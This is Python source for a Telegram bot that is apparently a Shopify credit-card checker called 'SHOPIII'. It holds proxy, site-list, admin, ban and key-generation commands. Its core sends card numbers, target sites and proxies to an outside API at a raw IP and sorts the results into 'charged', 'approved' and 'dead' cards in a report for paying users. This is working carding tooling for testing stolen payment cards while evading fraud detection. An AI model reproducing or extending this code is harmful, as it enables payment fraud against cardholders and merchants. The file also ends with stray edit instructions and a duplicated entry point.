@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    """Remove a single proxy from proxy.txt"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    current_proxies = load_proxies()

    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return

    new_proxies = [p for p in current_proxies if p != proxy_to_remove]

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    """Remove proxies by index (comma separated)"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return

    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
        return

    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)

    if not removed:
        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")

    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    """Remove all proxies from proxy.txt"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    current_proxies = load_proxies()
    count = len(current_proxies)

    if count == 0:
        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
        return

    # Send backup file to user
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"

    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")

        await event.reply(
            premium_emoji(
                f"📦 <b>Backup Created!</b>\n\n"
                f"Sending backup of {count} proxies before clearing..."
            ),
            file=backup_filename,
            parse_mode='html'
        )

        # Remove backup file after sending
        try:
            os.remove(backup_filename)
        except:
            pass

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
        return

    # Clear proxy.txt
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")

    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    """Get all proxies from proxy.txt"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    current_proxies = load_proxies()

    if not current_proxies:
        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
        return

    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"

        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")

        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')

        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/addproxy (.+)'))
async def add_proxy(event):
    user_id = event.sender_id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ 𝐎𝐧𝐥𝐲 𝐨𝐰𝐧𝐞𝐫𝐬/𝐚𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐚𝐝𝐝 𝐩𝐫𝐨𝐱𝐢𝐞𝐬!"), parse_mode='html')
        return
    
    proxy_url = event.pattern_match.group(1).strip()
    
    if not proxy_url:
        await event.reply(premium_emoji("❌ 𝐔𝐬𝐚𝐠𝐞: `/addproxy <proxy>`"), parse_mode='html')
        return
    
    try:
        await save_proxy_to_db(proxy_url, user_id)
        await event.reply(premium_emoji(f"✅ **Proxy Added!** 💎\n\n𝐏𝐫𝐨𝐱𝐲: `{proxy_url}`"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝐏𝐫𝐨𝐱𝐲 𝐀𝐝𝐝𝐞𝐝! **{str(e)}**"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/myproxy'))
async def my_proxy(event):
    user_id = event.sender_id
    try:
        user_proxies = await get_user_proxies(user_id)
        if not user_proxies:
            await event.reply(premium_emoji("❌ 𝐍𝐨 𝐩𝐫𝐨𝐱𝐢𝐞𝐬 𝐚𝐝𝐝𝐞𝐝 𝐛𝐲 𝐲𝐨𝐮!"), parse_mode='html')
            return
        
        proxy_list = "\n".join([f"**{i+1}.** `{p}`" for i, p in enumerate(user_proxies)])
        await event.reply(premium_emoji(f"🔥 𝐘𝐨𝐮𝐫 𝐏𝐫𝐨𝐱𝐢𝐞𝐬 ({len(user_proxies)}): 💎\n\n{proxy_list}"), parse_mode='html')
    except:
        await event.reply(premium_emoji("❌ 𝐄𝐫𝐫𝐨𝐫 𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐩𝐫𝐨𝐱𝐢𝐞𝐬!"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/delproxy (.+)'))
async def del_proxy(event):
    user_id = event.sender_id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("❌ 𝐎𝐧𝐥𝐲 𝐨𝐰𝐧𝐞𝐫𝐬/𝐚𝐝𝐦𝐢𝐧𝐬 𝐜𝐚𝐧 𝐝𝐞𝐥𝐞𝐭𝐞 𝐩𝐫𝐨𝐱𝐢𝐞𝐬!"), parse_mode='html')
        return
    
    proxy_url = event.pattern_match.group(1).strip()
    
    try:
        await delete_proxy_from_db(proxy_url)
        await event.reply(premium_emoji(f"✅ 𝐏𝐫𝐨𝐱𝐲 𝐃𝐞𝐥𝐞𝐭𝐞𝐝! 💎\n\n𝐏𝐫𝐨𝐱𝐲: `{proxy_url}`"), parse_mode='html')
    except:
        await event.reply(premium_emoji("❌ 𝐏𝐫𝐨𝐱𝐲 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝!"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm'))
async def remove_site_command(event):
    """Command to remove a site from sites.txt"""
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n\nOnly premium users can use this command."))
        return

    try:
        args = event.message.text.split(' ', 1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
            return

        url_to_remove = args[1].strip()
        current_sites = load_sites()

        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"))
            return

        new_sites = [site for site in current_sites if site != url_to_remove]

        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")

        await event.reply(premium_emoji(f"✅ 𝐒𝐢𝐭𝐞 𝐑𝐞𝐦𝐨𝐯𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error removing site: {e}"))

async def send_final_results(user_id, results):
    """Advanced Final Report like Black X Card (Pro Style)"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    total_time = f"{hours}h {minutes}m {seconds}s" if hours > 0 else f"{minutes}m {seconds}s"

    charged_count = len(results['charged'])
    approved_count = len(results['approved'])
    dead_count = len(results['dead'])

    # Main Summary
    summary = f"""<b>⚡💳 #𝒮𝒽𝑜𝓅𝒾𝒾𝒾 𝗙𝗶𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘂𝘀 ✅</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>Status → Final Status</b>
<blockquote>🔥 Charge : {charged_count}</blockquote>
<blockquote>✅ Approved : {approved_count}</blockquote>
<blockquote>❌ Declined : {dead_count}</blockquote>
<blockquote>⚠️ Others : 0</blockquote>

<b>Time Taken : {total_time}</b>
<b>Total Cards : {results['total']}</b>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: <a href="tg://user?id=8199994609">𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋</a></b>"""

    # Create detailed result file
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"MSH_Results_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("🔥 SHOPIII CC CHECKER - FINAL REPORT 🔥\n")
        await f.write("="*70 + "\n\n")
        await f.write(f"Total Cards     : {results['total']}\n")
        await f.write(f"Charged         : {charged_count}\n")
        await f.write(f"Approved        : {approved_count}\n")
        await f.write(f"Dead            : {dead_count}\n")
        await f.write(f"Time Taken      : {total_time}\n")
        await f.write(f"Date            : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n\n")
        await f.write("="*70 + "\n\n")

        if charged_count > 0:
            await f.write("🔥 CHARGED HITS 🔥\n")
            await f.write("-"*50 + "\n")
            for r in results['charged']:
                await f.write(f"{r['card']} | {r.get('gateway')} | {r.get('price')} | {r['message'][:100]}\n")
            await f.write("\n")

        if approved_count > 0:
            await f.write("✅ APPROVED HITS ✅\n")
            await f.write("-"*50 + "\n")
            for r in results['approved']:
                await f.write(f"{r['card']} | {r.get('gateway')} | {r.get('price')} | {r['message'][:100]}\n")
            await f.write("\n")

        await f.write("❌ ALL DEAD CARDS ❌\n")
        await f.write("-"*50 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway')} | {r.get('message')[:80]}\n")

    # Send Advanced Report
    await bot.send_message(
        user_id,
        premium_emoji(summary),
        file=filename,
        parse_mode='html'
    )

    try:
        os.remove(filename)
    except:
        pass

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    """Check all proxies and remove dead ones using a test card and site"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n\nOnly premium users can use this command."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty. Nothing to check."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies in batches of 50..."))

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            await status_msg.edit(
                premium_emoji(
                    f"🔥 Checking proxies...\n\n"
                    f"<b>Checked:</b> {min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}\n"
                    f"<b>Alive:</b> {len(alive_proxies)}\n"
                    f"<b>Dead:</b> {len(dead_proxies)}"
                ),
                parse_mode='html'
            )

        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")

        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n"
        summary_msg += f"<b>Total Proxies:</b> {len(proxies)}\n"
        summary_msg += f"<b>Alive:</b> {len(alive_proxies)}\n"
        summary_msg += f"<b>Removed:</b> {len(dead_proxies)}\n\n"
        summary_msg += "<code>proxy.txt</code> has been updated with only working proxies."

        await status_msg.edit(premium_emoji(summary_msg), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ An error occurred during proxy check: {e}"))

async def test_site_api_full(site, card, proxy, retries=3):
    """Full aggressive check with retries"""
    for attempt in range(retries + 1):
        try:
            if proxy:
                proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
            else:
                proxy_str = "no_proxy"
                
            api_url = f"http://76.13.78.203:5000/shopify?site={site}&cc={card}&proxy={proxy_str}"
            
            timeout = aiohttp.ClientTimeout(total=40)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(api_url) as resp:
                    text = await resp.text()
                    if resp.status == 200 and any(kw in text.lower() for kw in ["alive", "success", "ok", "valid", "order", "payment"]):
                        return {'site': site, 'status': 'alive'}
        except:
            pass
        if attempt < retries:
            await asyncio.sleep(1.5)
    return {'site': site, 'status': 'dead'}

# Callbacks for Pause/Resume/Stop
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer(premium_emoji("⏸️ Paused"))

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer(premium_emoji("▶️ Resumed"))

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer(premium_emoji("🛑 Stopped"))
        await event.edit(premium_emoji("😡 **Checking stopped by user.**"))

@bot.on(events.NewMessage(pattern='/addadmin'))
async def add_admin(event):
    if not is_owner(event.sender_id):
        await event.reply(premium_emoji("❌ Owner only command."))
        return
    try:
        uid = int(event.message.text.split()[1])
        if uid not in admins:
            admins.append(uid)
            save_list(ADMINS_FILE, admins)
            await event.reply(premium_emoji(f"✅ User {uid} added as Admin."))
    except:
        await event.reply(premium_emoji("Usage: /addadmin <user_id>"))

@bot.on(events.NewMessage(pattern='/rmadmin'))
async def rm_admin(event):
    if not is_owner(event.sender_id):
        await event.reply(premium_emoji("❌ Owner only."))
        return
    try:
        uid = int(event.message.text.split()[1])
        if uid in admins:
            admins.remove(uid)
            save_list(ADMINS_FILE, admins)
            await event.reply(premium_emoji(f"✅ Admin {uid} removed."))
    except:
        await event.reply(premium_emoji("Usage: /rmadmin <user_id>"))

@bot.on(events.NewMessage(pattern='/genkey'))
async def generate_key(event):
    if not is_admin(event.sender_id):
        return
    key = f"SHOPIII-{random.randint(100000,999999)}-{int(time.time())}"
    await event.reply(premium_emoji(f"🔑 New Key Generated:\n<code>{key}</code>\n\nSend this to user to activate (manual add to code or extend later)."))

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_user(event):
    if not is_admin(event.sender_id):
        return
    try:
        uid = int(event.message.text.split()[1])
        if uid not in banned:
            banned.append(uid)
            save_list(BANNED_FILE, banned)
            await event.reply(premium_emoji(f"✅ User {uid} banned."))
    except:
        await event.reply(premium_emoji("Usage: /ban <user_id>"))

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_user(event):
    if not is_admin(event.sender_id):
        return
    try:
        uid = int(event.message.text.split()[1])
        if uid in banned:
            banned.remove(uid)
            save_list(BANNED_FILE, banned)
            await event.reply(premium_emoji(f"✅ User {uid} unbanned."))
    except:
        await event.reply(premium_emoji("Usage: /unban <user_id>"))

# ================== ALL OTHER COMMANDS (with permission check) ==================
async def check_access(event):
    if is_banned(event.sender_id):
        await event.reply(premium_emoji("❌ You are banned."))
        return False
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Only Admins can use this bot. Contact Owner."))
        return False
    return True

@bot.on(events.NewMessage(pattern=r'^/info'))
async def user_info(event):
    user_id = event.sender_id
    
    try:
        # Get user details
        sender = await event.get_sender()
        username = f"@{sender.username}" if sender.username else "No @"
        first_name = sender.first_name or "Unknown"
        last_name = sender.last_name or ""
        full_name = f"{first_name} {last_name}".strip()
        
        # Bot status checks
        is_bot_owner = is_owner(user_id)
        is_bot_admin = is_admin(user_id) and not is_bot_owner
        is_bot_premium = is_premium(user_id) and not is_bot_admin and not is_bot_owner
        is_bot_free = not is_premium(user_id)
        
        # Telegram Premium status
        is_telegram_premium = getattr(sender, 'premium', False)
        tg_premium_status = "✅ 𝐘𝐄𝐒" if is_telegram_premium else "❌ 𝐍𝐎"
        
        # User status badge (priority: Owner > Admin > Premium > Free)
        if is_bot_owner:
            user_status = " 𝐎𝐖𝐍𝐄𝐑 💎"
        elif is_bot_admin:
            user_status = " 𝐀𝐃𝐌𝐈𝐍 ✨"
        elif is_bot_premium:
            user_status = " 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 ✅"
        else:
            user_status = " 𝐅𝐑𝐄𝐄"
        
        info_text = f"""⚡ <b>𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢</b> ⚡ \n
<b>💎 ━━━━━━━━━━━━━━━━━━━━━━━━━━━ 💎</b>

👤 <b>Name:</b> {full_name}
🆔 <b>ID:</b> <code>{user_id}</code> <i>{username}</i>

📊 <b>𝗦𝗧𝗔𝗧𝗨𝗦</b> - {user_status}
🔥 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 - {tg_premium_status} 

<b>💎 ━━━━━━━━━━━━━━━━━━━━━━━━━━━ 💎</b>

🤖 <b>Bot By: TELEGRAM</b>"""
        
        await event.reply(premium_emoji(info_text), parse_mode='html')
        
    except Exception as e:
        await event.reply(premium_emoji(f"❌ **Error:** {str(e)}"), parse_mode='html')

init_database()

# DELETE everything from "async def main():" to end

# ADD THIS INSTEAD:
async def main():
    print("🚀 SHOPIII Starting...")
    
    # Create files if missing
    for f in [SITES_FILE, PROXY_FILE, ADMINS_FILE, BANNED_FILE]:
        if not os.path.exists(f):
            open(f, 'w').close()
    
    # CRITICAL: Safe startup
    if await safe_start():
        print("✅ BOT LIVE!")
        await bot.run_until_disconnected()
    else:
        print("❌ START FAILED")
        sys.exit(1)

if __name__ == '__main__':
    asyncio.run(main())

if __name__ == '__main__':
    asyncio.run(main())
